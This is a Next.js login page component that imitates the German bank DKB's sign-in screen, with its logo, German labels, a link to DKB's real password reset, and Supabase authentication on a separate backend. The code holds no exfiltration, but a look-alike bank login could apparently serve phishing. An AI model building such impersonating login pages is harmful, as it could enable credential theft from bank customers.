"use client"

import { type FormEvent, useState } from "react"
import { useRouter } from "next/navigation"
import { supabase } from "@/lib/supabase"
import DKBLogo from "@/components/DKBLogo"

export default function LoginPage() {
  const router = useRouter()
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [step, setStep] = useState<"username" | "password">("username")
  const [error, setError] = useState<string | null>(null)
  const [loading, setLoading] = useState(false)

  async function handleUsernameSubmit(e: FormEvent) {
    e.preventDefault()
    if (!username.trim()) return
    setStep("password")
  }

  async function handlePasswordSubmit(e: FormEvent) {
    e.preventDefault()
    setError(null)
    setLoading(true)

    const { error } = await supabase.auth.signInWithPassword({
      email: username,
      password,
    })

    if (error) {
      setError(error.message === "Invalid login credentials"
        ? "Anmeldename oder Passwort falsch."
        : error.message)
      setLoading(false)
      return
    }

    router.push("/dashboard")
  }

  return (
    <div className="min-h-screen bg-[#f3f9fe] flex flex-col">
      {/* Header */}
      <header className="bg-white border-b border-[rgba(8,76,128,0.21)]">
        <div className="mx-auto max-w-[1350px] px-6 m:px-[30px] flex items-center justify-between h-16">
          <a href="/" className="flex items-center">
            <DKBLogo className="h-8 w-auto text-[#006ac7]" />
          </a>
        </div>
      </header>

      {/* Login card */}
      <main className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-[400px] bg-white rounded-[12px] shadow-[0_2px_6px_rgba(4,94,184,0.12)] border border-[rgba(8,76,128,0.21)] p-8">
          {/* Logo in card */}
          <div className="flex justify-center mb-8">
            <DKBLogo className="h-7 w-auto text-[#006ac7]" />
          </div>

          {step === "username" ? (
            <form onSubmit={handleUsernameSubmit} className="space-y-5">
              <div className="relative">
                <input
                  id="anmeldename"
                  type="text"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  required
                  autoFocus
                  autoComplete="username"
                  className="peer w-full h-14 px-4 pt-5 pb-1 text-[17px] bg-transparent border border-[rgba(8,76,128,0.21)] rounded-[6px] outline-none transition-colors focus:border-[rgba(9,118,214,0.76)] focus:border-2"
                />
                <label
                  htmlFor="anmeldename"
                  className="absolute left-4 top-4 text-[rgba(15,47,71,0.66)] text-[17px] transition-all peer-focus:text-[15px] peer-focus:top-1 peer-focus:text-[#006ac7] peer-[:not(:placeholder-shown)]:text-[15px] peer-[:not(:placeholder-shown)]:top-1"
                >
                  Anmeldename
                </label>
              </div>

              <button
                type="submit"
                disabled={!username.trim()}
                className="w-full h-14 bg-[#0a59a8] text-white text-[17px] font-[500] rounded-[6px] hover:bg-[#134e8a] disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                Weiter
              </button>
            </form>
          ) : (
            <form onSubmit={handlePasswordSubmit} className="space-y-5">
              <div className="relative">
                <input
                  id="passwort"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                  autoFocus
                  autoComplete="current-password"
                  className="peer w-full h-14 px-4 pt-5 pb-1 text-[17px] bg-transparent border border-[rgba(8,76,128,0.21)] rounded-[6px] outline-none transition-colors focus:border-[rgba(9,118,214,0.76)] focus:border-2"
                />
                <label
                  htmlFor="passwort"
                  className="absolute left-4 top-4 text-[rgba(15,47,71,0.66)] text-[17px] transition-all peer-focus:text-[15px] peer-focus:top-1 peer-focus:text-[#006ac7] peer-[:not(:placeholder-shown)]:text-[15px] peer-[:not(:placeholder-shown)]:top-1"
                >
                  Passwort
                </label>
              </div>

              {error && (
                <div className="text-sm text-[#c22813] px-1">
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={loading || !password}
                className="w-full h-14 bg-[#0a59a8] text-white text-[17px] font-[500] rounded-[6px] hover:bg-[#134e8a] disabled:opacity-40 disabled:cursor-not-allowed transition-colors"
              >
                {loading ? "Wird geladen..." : "Anmelden"}
              </button>

              <div className="text-center">
                <button
                  type="button"
                  onClick={() => setStep("username")}
                  className="text-[#006ac7] text-[15px] hover:underline bg-transparent border-none cursor-pointer"
                >
                  Zurück
                </button>
              </div>

              <div className="text-center">
                <a
                  href="https://banking.dkb.de/reset-password"
                  className="text-[#006ac7] text-[15px] hover:underline"
                >
                  Passwort vergessen?
                </a>
              </div>
            </form>
          )}
        </div>
      </main>
    </div>
  )
}
